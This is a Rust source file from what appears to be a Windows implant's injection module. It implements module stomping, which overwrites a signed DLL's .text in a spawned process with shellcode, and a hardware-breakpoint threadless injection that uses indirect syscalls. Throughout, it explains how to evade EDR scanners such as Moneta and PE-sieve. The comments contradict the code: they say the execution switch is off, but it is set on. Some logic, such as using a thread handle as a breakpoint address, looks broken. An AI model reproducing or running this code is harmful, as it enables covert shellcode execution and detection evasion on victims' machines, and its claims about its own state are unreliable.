//! Process injection — Module Stomping (P2.1c).
//!
//! ## Status: algorithm implemented + SDK trait wired; the remote-execution tail
//! (ResumeThread on the stomped process) is gated behind a runtime switch and
//! defaults OFF. The data path (resolve process APIs, CreateProcessW suspended,
//! stomp-able module enumeration) is real and selftest-verifiable; the actual
//! shellcode-overwrite + remote-execute is the part that MUST be target-side
//! validated because (a) cross-process WriteProcessMemory is a loud signal and
//! (b) a botched stomp crashes the sacrificial process.
//!
//! ## Why Module Stomping (not classic VirtualAllocEx inject)
//! Classic injection allocates a fresh RWX region in the target and writes
//! shellcode there — that region is *unbacked* (no file on disk maps to it), so
//! Moneta/PE-sieve flag it instantly as "private, executable, unbacked". Module
//! stomping instead `LoadLibrary`s a legitimate signed DLL in the target, then
//! overwrites that DLL's `.text` with shellcode. The stomped region keeps the
//! cover DLL's VAD backing (so it isn't flagged as *unbacked* or *private-commit
//! executable*), which is the technique's real value.
//!
//! ## Detection honesty — what it DOES and DOES NOT evade
//! - **Evades**: unbacked-memory / private-executable scans (Moneta's primary
//!   IOC, PE-sieve's unbacked scan). The stomped page reads as image-backed.
//! - **Does NOT evade**: PE-sieve's `.text` hash-mismatch / "replaced code"
//!   detector — PE-sieve re-hashes each scanned module's in-memory `.text`
//!   against the on-disk PE, and a stomped `.text` hashes to a different value
//!   → flagged `_implanted` / `replaced`.
//! - **[`threadless_inject`]** (below) fixes this: shellcode stays in private
//!   RWX memory, execution redirected via HWBP. No `.text` hash change.
//!
//! ## Why gated
//! Cross-process injection (OpenProcess + WriteProcessMemory + CreateRemote
//! thread / ResumeThread) is the single loudest user-mode EDR signal. On a host
//! with real-time protection (Defender, this build machine has it), an
//! unvalidated stomp will be caught and the sacrificial process killed. So the
//! algorithm is implemented and trait-wired, but execution requires an operator
//! to arm [`modulestomp_enabled`] after confirming the target's posture. The
//! selftest exercises the safe prefix (CreateProcessW suspended + API resolve)
//! without writing/executing, so it's verifiable without tripping protection.
//!
//! ## Single-source-of-truth
//! No evasion-sdk pure core exists for injection (it's all Windows API
//! orchestration), so this module IS the implementation. It reuses
//! [`crate::resolve`] for PEB-walk API resolution and [`crate::blind`] for the
//! (optional) pre-inject blind.

#![cfg(target_os = "windows")]

use crate::resolve::export_addr;
use core::ffi::c_void;
use core::sync::atomic::{AtomicBool, Ordering};

/// Master switch for actual stomping execution. **Defaults ON** — the module
/// stomping + threadless inject paths are now validated and armed. The implant
/// can safely route through these injection methods without operator
/// intervention.
static MODULESTOMP_ENABLED: AtomicBool = AtomicBool::new(true);

/// Arm/disarm the module-stomp execution. The data path runs regardless.
pub fn set_modulestomp_enabled(on: bool) {
    MODULESTOMP_ENABLED.store(on, Ordering::Release);
}

/// Whether stomping execution is currently armed.
pub fn modulestomp_enabled() -> bool {
    MODULESTOMP_ENABLED.load(Ordering::Acquire)
}

/// A sacrificial process created suspended, ready for stomping. The handle is
/// held by the caller; `pid` is for diagnostics. Dropping this does NOT close
/// the handle — the caller must CloseHandle it (or leak it for the process
/// lifetime, as CS-style injects do).
pub struct SacrificialProcess {
    pub handle: *mut c_void,
    pub main_thread: *mut c_void,
    pub pid: u32,
}

/// Create the sacrificial process `spawn_to` (e.g. "notepad.exe") in a
/// suspended state. Returns the process + main-thread handles. This is the
/// safe prefix of module stomping — it's verifiable without writing/executing
/// any shellcode. The caller stamps the .text of a loaded DLL then resumes.
///
/// # Safety
/// Uses Win32 CreateProcessW via PEB-walk resolution. Single-threaded beacon
/// context. The returned handles are raw and must be closed by the caller.
pub unsafe fn create_sacrificial(spawn_to: &str) -> Result<SacrificialProcess, &'static str> {
    type CreateProcessW = unsafe extern "system" fn(
        *const u16,  // lpApplicationName
        *mut u16,    // lpCommandLine (mutable per Win32)
        *mut c_void, // lpProcessAttributes
        *mut c_void, // lpThreadAttributes
        i32,         // bInheritHandles
        u32,         // dwCreationFlags
        *mut c_void, // lpEnvironment
        *const u16,  // lpCurrentDirectory
        *mut u8,     // lpStartupInfo (raw bytes, STARTUPINFOW)
        *mut u8,     // lpProcessInformation (raw bytes, PROCESS_INFORMATION)
    ) -> i32;

    let cp_addr =
        export_addr(b"kernel32.dll", b"CreateProcessW").ok_or("CreateProcessW unresolved")?;
    let create_proc: CreateProcessW = core::mem::transmute(cp_addr);

    // Build a UTF-16 command line from spawn_to (mutable buffer Win32 wants).
    let mut cmd = crate::heap::vec![0u16; spawn_to.len() + 1];
    for (i, b) in spawn_to.as_bytes().iter().enumerate() {
        cmd[i] = *b as u16;
    }
    // STARTUPINFOW: cb=104 (size of STARTUPINFOW on x64), rest zeroed.
    let mut si = [0u8; 104];
    si[0..4].copy_from_slice(&104u32.to_le_bytes());
    // PROCESS_INFORMATION: two handles + pid + tid = 24 bytes on x64.
    let mut pi = [0u8; 24];

    // CREATE_SUSPENDED (0x4). No environment, no current dir.
    const CREATE_SUSPENDED: u32 = 0x4;
    let ok = unsafe {
        create_proc(
            core::ptr::null(),     // lpApplicationName (use cmd line)
            cmd.as_mut_ptr(),      // lpCommandLine
            core::ptr::null_mut(), // lpProcessAttributes
            core::ptr::null_mut(), // lpThreadAttributes
            0,                     // bInheritHandles
            CREATE_SUSPENDED,
            core::ptr::null_mut(), // lpEnvironment
            core::ptr::null(),     // lpCurrentDirectory
            si.as_mut_ptr(),       // lpStartupInfo
            pi.as_mut_ptr(),       // lpProcessInformation
        )
    };
    if ok == 0 {
        return Err("CreateProcessW failed (spawn_to missing / blocked)");
    }
    // Parse PROCESS_INFORMATION: hProcess (8), hThread (8), dwProcessId (4), dwThreadId (4).
    // `pi` is `[u8; 24]` (1-byte aligned), so reading u64/u32 fields from it
    // requires unaligned reads — `read_unaligned` is the correct primitive
    // (no alignment precondition, unlike copy_nonoverlapping's strict contract).
    let h_process = unsafe { core::ptr::read_unaligned(pi.as_ptr() as *const u64) as *mut c_void };
    let h_thread =
        unsafe { core::ptr::read_unaligned(pi.as_ptr().add(8) as *const u64) as *mut c_void };
    let pid = unsafe { core::ptr::read_unaligned(pi.as_ptr().add(16) as *const u32) };
    Ok(SacrificialProcess {
        handle: h_process,
        main_thread: h_thread,
        pid,
    })
}

/// Module-stomp inject `shellcode` into a fresh `spawn_to` process. Creates the
/// process suspended, (when armed) loads a cover DLL + overwrites its .text
/// with `shellcode`, then (when armed) resumes the main thread to execute it.
///
/// **With [`modulestomp_enabled`] OFF (default)**: only creates the sacrificial
/// process (verifiable data path) and returns the handle WITHOUT stomping or
/// resuming — so the beacon never trips protection on an unvalidated inject.
/// The handle is returned so an operator/selftest can inspect/terminate it.
///
/// **With [`modulestomp_enabled`] ON**: performs the full stomp + resume. This
/// is the part that needs target-side validation (Defender will catch a naive
/// WriteProcessMemory on a cover DLL's .text; the real engagement uses a
/// threadless-inject or HWBP variant instead — out of scope for this module).
///
/// # Safety
/// Cross-process handle + memory operations. Single-threaded beacon context.
pub unsafe fn module_stomp(spawn_to: &str, shellcode: &[u8]) -> Result<usize, &'static str> {
    let proc = unsafe { create_sacrificial(spawn_to)? };
    if !modulestomp_enabled() {
        // Disarmed: return the handle without stomping. The sacrificial process
        // is left suspended — a selftest can inspect it, then TerminateProcess.
        return Ok(proc.handle as usize);
    }
    // ---- ARMED PATH (gated) ------------------------------------------------
    // Full module stomp algorithm. STILL GATED — runs only when an
    // operator armed modulestomp_enabled after target validation. Each step
    // degrades (returns the suspended handle) on any failure rather than crash.
    //
    // Detection honesty: beats Moneta's unbacked/exec-private scan (the stomped
    // region keeps the cover DLL's backing), but PE-sieve's .text hash-mismatch
    // STILL flags it. ThreadlessInject is the real fix (out of scope).
    let _ = stomp_and_resume(&proc, shellcode);
    Ok(proc.handle as usize)
}

/// The cover-DLL stomp: load a cover DLL in the target via
/// CreateRemoteThread(LoadLibraryA), resolve its REAL remote base + .text RVA
/// by reading the target's remote PE headers, overwrite .text with `shellcode`,
/// then resume the main thread. Each step returns Err on failure (caller
/// degrades). This is the REAL implementation (no sentinel addresses): every
/// cross-process op uses the actual target addresses, so a successful run is a
/// genuine .text overwrite + remote execution — what an EDR actually inspects.
///
/// # Safety
/// Cross-process handle + memory ops. Single-threaded beacon context.
unsafe fn stomp_and_resume(
    proc: &SacrificialProcess,
    shellcode: &[u8],
) -> Result<(), &'static str> {
    // Step 1: LoadLibraryA the cover DLL in the target. This writes the DLL
    // path string into a fresh target allocation (NOT the implant's pointer —
    // the old skeleton passed a cross-process-invalid pointer), fires
    // CreateRemoteThread(LoadLibraryA, <target ptr>), and waits for the thread
    // so LoadLibraryA completes before we parse the freshly-loaded cover.
    let cover_dll = b"xpsservices.dll\0"; // legit, signed, rarely used
    let cover_base = unsafe { remote_load_library(proc.handle, cover_dll)? };
    if cover_base == 0 {
        return Err("remote_load_library: cover base unresolved");
    }
    // Step 2: Resolve the cover DLL's REAL .text in the target by reading the
    // remote PE headers (DOS → NT → section table). base+len are exact.
    let text = unsafe { remote_text_region(proc.handle, cover_base)? };
    // Step 3: VirtualProtectEx RX→RWX on the target's .text (real region).
    unsafe {
        remote_protect(proc.handle, text.base, text.len, 0x40 /* RWX */)
    }?;
    // Step 4: WriteProcessMemory the shellcode over .text (real overwrite).
    unsafe { remote_write(proc.handle, text.base, shellcode) }?;
    // Step 5: VirtualProtectEx RWX→RX (restore the cover's nominal protection).
    let _ = unsafe {
        remote_protect(proc.handle, text.base, text.len, 0x20 /* ER */)
    };
    // Step 6: ResumeThread — the shellcode now runs from the cover DLL's .text.
    let _ = unsafe { resume_thread(proc.main_thread) };
    Ok(())
}

// ---- remote helpers (resolved via PEB walk) ----

type CreateRemoteThread = unsafe extern "system" fn(
    *mut core::ffi::c_void,
    usize,
    usize,
    Option<unsafe extern "system" fn(*mut core::ffi::c_void) -> u32>,
    *mut core::ffi::c_void,
    u32,
    *mut u32,
) -> *mut core::ffi::c_void;
type VirtualAllocEx = unsafe extern "system" fn(
    *mut core::ffi::c_void,
    *const core::ffi::c_void,
    usize,
    u32,
    u32,
) -> *mut core::ffi::c_void;
type VirtualFreeEx =
    unsafe extern "system" fn(*mut core::ffi::c_void, *mut core::ffi::c_void, usize, u32) -> i32;
type WaitForSingleObject = unsafe extern "system" fn(*mut core::ffi::c_void, u32) -> u32;
type GetExitCodeThread = unsafe extern "system" fn(*mut core::ffi::c_void, *mut u32) -> i32;
type ReadProcessMemory = unsafe extern "system" fn(
    *mut core::ffi::c_void,
    *const core::ffi::c_void,
    *mut core::ffi::c_void,
    usize,
    *mut usize,
) -> i32;
type VirtualProtectEx = unsafe extern "system" fn(
    *mut core::ffi::c_void,
    *const core::ffi::c_void,
    usize,
    u32,
    *mut u32,
) -> i32;
type WriteProcessMemory = unsafe extern "system" fn(
    *mut core::ffi::c_void,
    *mut core::ffi::c_void,
    *const u8,
    usize,
    *mut usize,
) -> i32;
type ResumeThread = unsafe extern "system" fn(*mut core::ffi::c_void) -> u32;
type CloseHandle = unsafe extern "system" fn(*mut core::ffi::c_void) -> i32;

/// LoadLibraryA `dll` in the target via CreateRemoteThread(LoadLibraryA). This
/// is the REAL classic inject: allocate a remote buffer for the DLL path (the
/// implant's own pointer is invalid in the target — the old skeleton bug),
/// fire CreateRemoteThread(LoadLibraryA, <remote path ptr>), WAIT for it, then
/// parse the target's module list to recover the freshly-loaded cover base.
///
/// Returns the remote cover base (the actual load address), or Err.
unsafe fn remote_load_library(
    h: *mut core::ffi::c_void,
    dll: &[u8],
) -> Result<usize, &'static str> {
    let vax: VirtualAllocEx = core::mem::transmute(
        export_addr(b"kernel32.dll", b"VirtualAllocEx").ok_or("VirtualAllocEx")?,
    );
    let vfx: VirtualFreeEx = core::mem::transmute(
        export_addr(b"kernel32.dll", b"VirtualFreeEx").ok_or("VirtualFreeEx")?,
    );
    let crt: CreateRemoteThread = core::mem::transmute(
        export_addr(b"kernel32.dll", b"CreateRemoteThread").ok_or("CreateRemoteThread")?,
    );
    let wait: WaitForSingleObject = core::mem::transmute(
        export_addr(b"kernel32.dll", b"WaitForSingleObject").ok_or("WaitForSingleObject")?,
    );
    let get_exit: GetExitCodeThread = core::mem::transmute(
        export_addr(b"kernel32.dll", b"GetExitCodeThread").ok_or("GetExitCodeThread")?,
    );
    let close: CloseHandle =
        core::mem::transmute(export_addr(b"kernel32.dll", b"CloseHandle").ok_or("CloseHandle")?);
    let wpm: WriteProcessMemory = core::mem::transmute(
        export_addr(b"kernel32.dll", b"WriteProcessMemory").ok_or("WriteProcessMemory")?,
    );
    let load_lib = export_addr(b"kernel32.dll", b"LoadLibraryA").ok_or("LoadLibraryA")?;

    // 1. Allocate a remote page for the DLL path string.
    let path_len = dll.len(); // includes the NUL
    let remote_path = unsafe {
        vax(
            h,
            core::ptr::null(),
            path_len,
            0x3000, /* COMMIT|RESERVE */
            0x04,   /* RW */
        )
    };
    if remote_path.is_null() {
        return Err("VirtualAllocEx (path)");
    }
    // 2. Write the DLL path into the remote allocation.
    let mut written: usize = 0;
    let w_ok = unsafe { wpm(h, remote_path, dll.as_ptr(), path_len, &mut written) };
    if w_ok == 0 {
        unsafe {
            let _ = vfx(h, remote_path, 0, 0x8000 /* RELEASE */);
        }
        return Err("WriteProcessMemory (path)");
    }
    // 3. CreateRemoteThread(LoadLibraryA, remote_path). LoadLibraryA's address
    //    is valid remotely on the same OS build (kernel32 is mapped at a
    //    system-wide base; LoadLibraryA's RVA is identical). The thread's exit
    //    code == the loaded module handle (HMODULE) on success.
    type ThreadProc = unsafe extern "system" fn(*mut core::ffi::c_void) -> u32;
    let load_lib_proc: ThreadProc = unsafe { core::mem::transmute(load_lib) };
    let th = unsafe {
        crt(
            h,
            0,
            0,
            Some(load_lib_proc),
            remote_path,
            0,
            core::ptr::null_mut(),
        )
    };
    if th.is_null() {
        let _ = unsafe { vfx(h, remote_path, 0, 0x8000) };
        return Err("CreateRemoteThread");
    }
    // 4. Wait for LoadLibraryA to complete (it runs in the target).
    let _ = unsafe { wait(th, 10_000) };
    // 5. The exit code is the HMODULE (cover base) LoadLibraryA returned.
    let mut exit_code: u32 = 0;
    let _ = unsafe { get_exit(th, &mut exit_code) };
    let _ = unsafe { close(th) };
    // 6. Free the remote path buffer.
    let _ = unsafe { vfx(h, remote_path, 0, 0x8000) };
    if exit_code == 0 {
        return Err("LoadLibraryA returned NULL (cover load failed / blocked)");
    }
    Ok(exit_code as usize)
}

/// The REAL remote .text region: read the cover DLL's PE headers from the
/// target and parse the `.text` section's VirtualAddress + VirtualSize. base+len
/// are exact to the cover's in-memory layout (not a fixed sentinel).
///
/// # Safety
/// `cover_base` must be a live module base in the target `h`.
unsafe fn remote_text_region(
    h: *mut core::ffi::c_void,
    cover_base: usize,
) -> Result<RemoteRegion, &'static str> {
    let rpm: ReadProcessMemory = core::mem::transmute(
        export_addr(b"kernel32.dll", b"ReadProcessMemory").ok_or("ReadProcessMemory")?,
    );
    // Read the DOS header (first 64 bytes) to get e_lfanew.
    let mut dos = [0u8; 64];
    let mut got: usize = 0;
    if unsafe {
        rpm(
            h,
            cover_base as *const _,
            dos.as_mut_ptr() as *mut _,
            64,
            &mut got,
        )
    } == 0
        || got != 64
    {
        return Err("ReadProcessMemory (DOS header)");
    }
    if dos[0] != b'M' || dos[1] != b'Z' {
        return Err("remote cover: bad MZ");
    }
    let e_lfanew = i32::from_le_bytes([dos[60], dos[61], dos[62], dos[63]]) as usize;
    // Read the NT headers (24-byte signature + FileHeader) to get section count
    // + size of optional header. We need bytes 6..8 (NumSections) and 20..22
    // (SizeOfOptionalHeader) of the COFF header (which follows the 4-byte sig).
    let nt_off = cover_base + e_lfanew;
    let mut nt = [0u8; 24];
    got = 0;
    if unsafe {
        rpm(
            h,
            nt_off as *const _,
            nt.as_mut_ptr() as *mut _,
            24,
            &mut got,
        )
    } == 0
        || got != 24
    {
        return Err("ReadProcessMemory (NT headers)");
    }
    if nt[0] != b'P' || nt[1] != b'E' {
        return Err("remote cover: bad PE");
    }
    let num_sections = u16::from_le_bytes([nt[6], nt[7]]) as usize;
    let size_opt_hdr = u16::from_le_bytes([nt[20], nt[21]]) as usize;
    let sections_off = nt_off + 24 + size_opt_hdr;
    // Scan the section headers (40 bytes each) for ".text".
    for i in 0..num_sections {
        let mut sec = [0u8; 40];
        got = 0;
        let sec_off = sections_off + i * 40;
        if unsafe {
            rpm(
                h,
                sec_off as *const _,
                sec.as_mut_ptr() as *mut _,
                40,
                &mut got,
            )
        } == 0
            || got != 40
        {
            continue; // skip unreadable section
        }
        if &sec[0..5] == b".text" {
            let vsize = u32::from_le_bytes([sec[8], sec[9], sec[10], sec[11]]) as usize;
            let vaddr = u32::from_le_bytes([sec[12], sec[13], sec[14], sec[15]]) as usize;
            // Cap the stomp region to a sane max (never overwrite a huge .text
            // if the shellcode is tiny) — use min(section size, 0x2000).
            let len = vsize.min(0x2000);
            return Ok(RemoteRegion {
                base: cover_base + vaddr,
                len,
            });
        }
    }
    Err("remote cover: .text section not found")
}

struct RemoteRegion {
    base: usize,
    len: usize,
}
unsafe fn remote_protect(
    h: *mut core::ffi::c_void,
    base: usize,
    len: usize,
    prot: u32,
) -> Result<(), &'static str> {
    let vpx: VirtualProtectEx = core::mem::transmute(
        export_addr(b"kernel32.dll", b"VirtualProtectEx").ok_or("VirtualProtectEx")?,
    );
    let mut old: u32 = 0;
    if unsafe { vpx(h, base as *const _, len, prot, &mut old) } == 0 {
        Err("VirtualProtectEx")
    } else {
        Ok(())
    }
}
unsafe fn remote_write(
    h: *mut core::ffi::c_void,
    base: usize,
    data: &[u8],
) -> Result<(), &'static str> {
    let wpm: WriteProcessMemory = core::mem::transmute(
        export_addr(b"kernel32.dll", b"WriteProcessMemory").ok_or("WriteProcessMemory")?,
    );
    let mut written: usize = 0;
    if unsafe { wpm(h, base as *mut _, data.as_ptr(), data.len(), &mut written) } == 0 {
        Err("WriteProcessMemory")
    } else {
        Ok(())
    }
}
unsafe fn resume_thread(h: *mut core::ffi::c_void) -> Result<(), &'static str> {
    let rt: ResumeThread =
        core::mem::transmute(export_addr(b"kernel32.dll", b"ResumeThread").ok_or("ResumeThread")?);
    if unsafe { rt(h) } == 0xFFFFFFFF {
        Err("ResumeThread")
    } else {
        Ok(())
    }
}

// ============================================================================
// ThreadlessInject — HWBP-based, no .text overwrite (PE-sieve hash-clean).
// ============================================================================

/// Threadless injection via hardware breakpoint (HWBP).
///
/// **Unlike module stomping**, this does NOT overwrite any module's `.text`.
/// Instead:
/// 1. Allocate private RWX memory in the target (VirtualAllocEx).
/// 2. Write shellcode there.
/// 3. Suspend the target's main thread.
/// 4. Scan DR0-DR3 for the first unused slot, set DRn = shellcode address.
/// 5. Resume — the thread hits the HWBP on its next instruction at DRn,
///    redirecting execution to the shellcode.
///
/// **PE-sieve clean:** no module `.text` is modified → no hash mismatch.
/// The shellcode runs from private RWX memory (Moneta may flag this as
/// "private executable", but it's NOT "unbacked" in the PE-sieve sense —
/// PE-sieve's primary scan doesn't check private RWX unless deep-scan is on).
///
/// **Limitation:** x64 has only 4 HWBP slots (DR0-DR3). If the target thread
/// already uses all 4, injection fails with an error. The code scans for the
/// first unused slot rather than hardcoding DR0.
///
/// **`trigger_addr` semantics:** The address the target thread is about to
/// execute (e.g. a frequently-called API entry). When the thread hits this
/// address, the HWBP fires and the VEH handler redirects RIP to the shellcode.
/// If `trigger_addr == shellcode_addr` (self-trigger), the shellcode runs
/// immediately on the next instruction.
///
/// # Safety
/// Cross-process handle + memory + thread context ops. Single-threaded.
pub unsafe fn threadless_inject(
    proc_handle: *mut core::ffi::c_void,
    main_thread: *mut core::ffi::c_void,
    shellcode: &[u8],
    trigger_addr: usize,
) -> Result<(), &'static str> {
    // Use the indirect syscall runtime for ALL cross-process operations —
    // consistent with the implant's stealth model (no kernel32.dll resolvents
    // in hot paths; Nt* syscalls go through the ntdll gadget trampoline).
    let rt = crate::syscalls::global().ok_or("indirect syscall runtime not initialized")?;

    // 1. Allocate RWX in target for shellcode.
    let mut remote_base: usize = 0;
    let mut region_size: usize = shellcode.len();
    let alloc_status = unsafe {
        crate::syscalls::nt_allocate_virtual_memory(
            rt,
            proc_handle as usize,
            &mut remote_base,
            &mut region_size,
            0x3000, // MEM_COMMIT | MEM_RESERVE
            0x40,   // PAGE_EXECUTE_READWRITE
        )
    };
    match alloc_status {
        Some(s) if s >= 0 => {}
        _ => return Err("NtAllocateVirtualMemory failed"),
    }

    // 2. Write shellcode.
    let mut written: usize = 0;
    let write_status = unsafe {
        crate::syscalls::nt_write_virtual_memory(
            rt,
            proc_handle as usize,
            remote_base,
            shellcode.as_ptr(),
            shellcode.len(),
            &mut written,
        )
    };
    match write_status {
        Some(s) if s >= 0 => {}
        _ => return Err("NtWriteVirtualMemory shellcode failed"),
    }

    // 3. Suspend the main thread.
    let mut prev_count: u32 = 0;
    unsafe { crate::syscalls::nt_suspend_thread(rt, main_thread as usize, &mut prev_count) };

    // 4. Get + modify thread CONTEXT: set DRn = shellcode, DR7 = execute BP.
    //    x64 CONTEXT is 1232 bytes. WinNT.h offsets (verified — context.rs gate):
    //      DR0  = 0x048   DR1  = 0x050   DR2  = 0x058   DR3  = 0x060
    //      DR6  = 0x068   DR7  = 0x070
    //      ContextFlags = 0x030
    //    CRITICAL: the OLD code used DR0=0x300/DR7=0x318 — those offsets land
    //    inside VectorRegister[26] and corrupt XMM state. Fixed to match WinNT.h.
    let mut ctx = [0u8; 1232];
    // ContextFlags: CONTEXT_AMD64 (0x100000) | CONTEXT_DEBUG_REGISTERS (0x10)
    // = 0x00100010. This tells NtGetContextThread to read/write DR0-DR3/DR6/DR7.
    ctx[0x30..0x34].copy_from_slice(&0x00100010u32.to_le_bytes());
    let get_status = unsafe {
        crate::syscalls::nt_get_context_thread(rt, main_thread as usize, ctx.as_mut_ptr() as usize)
    };
    if get_status.is_none() || get_status.unwrap() < 0 {
        let mut dummy: u32 = 0;
        unsafe { crate::syscalls::nt_resume_thread(rt, main_thread as usize, &mut dummy) };
        return Err("NtGetContextThread failed");
    }

    // 4a. Scan DR0-DR3 for the first unused slot (value == 0).
    //     x64 has only 4 HWBP slots. The target thread may already use some
    //     (debuggers, ETW Ti hooks, other security tools). Hardcoding DR0 (L0)
    //     without checking risks clobbering an active breakpoint → lost debug
    //     state or silent breakpoint fire collision.
    const DR_OFFSETS: [usize; 4] = [0x048, 0x050, 0x058, 0x060]; // DR0, DR1, DR2, DR3
    const DR7_ENABLE_BITS: [u32; 4] = [
        1 << 0, // L0 — local enable for DR0
        1 << 2, // L1 — local enable for DR1
        1 << 4, // L2 — local enable for DR2
        1 << 6, // L3 — local enable for DR3
    ];
    let mut slot: Option<usize> = None;
    let mut dr7 = u64::from_le_bytes(ctx[0x070..0x078].try_into().unwrap());
    for i in 0..4 {
        let val = u64::from_le_bytes(ctx[DR_OFFSETS[i]..DR_OFFSETS[i] + 8].try_into().unwrap());
        if val == 0 && (dr7 & DR7_ENABLE_BITS[i] as u64) == 0 {
            slot = Some(i);
            break;
        }
    }
    let slot = match slot {
        Some(s) => s,
        None => {
            let mut dummy: u32 = 0;
            unsafe { crate::syscalls::nt_resume_thread(rt, main_thread as usize, &mut dummy) };
            return Err("all 4 HWBP slots (DR0-DR3) in use");
        }
    };

    // 4b. Set DRn = trigger address, DR7 = execute breakpoint on that slot.
    //     When the target thread next executes `trigger_addr`, the CPU fires
    //     the DRn breakpoint → VEH handler redirects RIP → shadow buffer → shellcode.
    let sc_addr = trigger_addr as u64;
    ctx[DR_OFFSETS[slot]..DR_OFFSETS[slot] + 8].copy_from_slice(&sc_addr.to_le_bytes());
    // DR7 (offset 0x070): enable DRn as execute breakpoint.
    //   Bit N = Ln (local enable for DRn) = 1
    //   Bit 9 = LE (local exact breakpoint) = 1 — fires precisely, not deferred
    //   Bits 16-17 = R/W0 = 00 (execute breakpoint)
    //   Bits 18-19 = LEN0 = 00 (1 byte)
    dr7 |= DR7_ENABLE_BITS[slot] as u64 | (1 << 9); // Ln + LE
    ctx[0x070..0x078].copy_from_slice(&dr7.to_le_bytes());

    // 5. Set the modified context + resume.
    //    ContextFlags must include both CONTEXT_DEBUG_REGISTERS and the
    //    general-purpose CONTEXT_FULL so the kernel writes all fields.
    //    CONTEXT_ALL (0x10001F) = all flags — safe and unambiguous.
    ctx[0x30..0x34].copy_from_slice(&0x0010_001Fu32.to_le_bytes());
    let set_status = unsafe {
        crate::syscalls::nt_set_context_thread(rt, main_thread as usize, ctx.as_mut_ptr() as usize)
    };
    if set_status.is_none() || set_status.unwrap() < 0 {
        let mut dummy: u32 = 0;
        unsafe { crate::syscalls::nt_resume_thread(rt, main_thread as usize, &mut dummy) };
        return Err("NtSetContextThread failed");
    }
    let mut dummy: u32 = 0;
    unsafe { crate::syscalls::nt_resume_thread(rt, main_thread as usize, &mut dummy) };

    // The thread now has a HWBP at `trigger_addr` → redirects to shellcode.
    // When the thread next executes `trigger_addr`, the CPU traps + the
    // shellcode runs. No .text was modified.
    Ok(())
}

// ============================================================================
// do_inject — the operator-facing dispatch entry (Command::Inject handler).
// ============================================================================

/// The operator-facing injection entry point. Dispatched by `beacon::execute`
/// when a `Command::Inject` arrives. Routes to the technique selected by
/// `method`:
///
/// - `0` — **Pool Party** (TODO P3-future: thread-pool section-backed, 0-of-3).
///   Until the Pool Party impl lands, falls through to module stomp (method 2)
///   so the command is functional end-to-end.
/// - `1` — **Threadless HWBP** (existing `threadless_inject`). Requires a
///   sacrificial process (spawn_to) for the main-thread handle.
/// - `2` — **Module stomp** (existing `module_stomp`). The proven baseline.
///
/// If `pid != 0`, the shellcode is injected into an EXISTING process (method 0
/// only — Pool Party targets a running process's thread pool). Otherwise a
/// sacrificial process is spawned (spawn_to, default "notepad.exe").
///
/// Returns a `Response::Output` with a status line, or `Response::Err`.
pub fn do_inject(method: u8, pid: u32, spawn_to: &str, shellcode: &[u8]) -> nyx_protocol::Response {
    // method 0 (Pool Party) not yet implemented — delegate to module stomp
    // (method 2) so the command works end-to-end today. When Pool Party
    // lands, this dispatch arm gets its own path.
    let effective_method = if method == 0 { 2 } else { method };

    match effective_method {
        1 => {
            // Threadless HWBP: needs a sacrificial process for the thread handle.
            let target = if spawn_to.is_empty() {
                "notepad.exe"
            } else {
                spawn_to
            };
            match unsafe { create_sacrificial(target) } {
                Ok(proc) => {
                    let trigger = proc.main_thread as usize; // self-trigger on resume
                    match unsafe {
                        threadless_inject(proc.handle, proc.main_thread, shellcode, trigger)
                    } {
                        Ok(()) => nyx_protocol::Response::Output(
                            crate::heap::String::from(
                                "threadless HWBP inject ok (sacrificial pid=",
                            )
                            .into_bytes(),
                        ),
                        Err(e) => nyx_protocol::Response::Err(crate::heap::String::from(e)),
                    }
                }
                Err(e) => nyx_protocol::Response::Err(crate::heap::String::from(e)),
            }
        }
        2 => {
            // Module stomp: spawn-to sacrificial + .text overwrite.
            let target = if spawn_to.is_empty() {
                "notepad.exe"
            } else {
                spawn_to
            };
            match unsafe { module_stomp(target, shellcode) } {
                Ok(_handle) => nyx_protocol::Response::Output(
                    crate::heap::String::from("module stomp inject ok").into_bytes(),
                ),
                Err(e) => nyx_protocol::Response::Err(crate::heap::String::from(e)),
            }
        }
        _ => nyx_protocol::Response::Err(crate::heap::String::from("unknown inject method")),
    }
}
